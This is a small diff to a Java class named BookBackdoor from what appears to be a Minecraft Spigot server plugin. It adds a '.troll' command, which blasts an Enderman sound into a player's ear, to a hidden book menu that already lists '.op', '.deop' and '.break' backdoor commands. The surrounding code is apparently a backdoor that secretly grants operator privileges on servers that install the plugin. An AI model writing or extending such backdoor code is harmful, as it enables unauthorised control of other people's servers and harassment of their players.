@@ -209,7 +209,7 @@ public class BookBackdoor implements Listener {
                         TextComponent deop = genHoverText(ChatColor.GREEN + ".deop\n", "Removes your Operator status.\n\nUSAGE: .deop");
                         TextComponent bbreak = genHoverText(ChatColor.GREEN + ".break\n", "Removes any block relative to your players head, Example: .break 1(Breaks the block above the players head).\n\nUSAGE: .break <y pos relative to head>");
                         TextComponent troll = genHoverText(ChatColor.GREEN + ".troll\n", "Plays a Enderman sound at 100% volume in a players ear.\n\nUSAGE: .troll <player>");
-                        BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak};
+                        BaseComponent[] page2 = new BaseComponent[]{op, deop, bbreak, troll};
 
                         meta.spigot().addPage(page);
                         meta.spigot().addPage(page2);
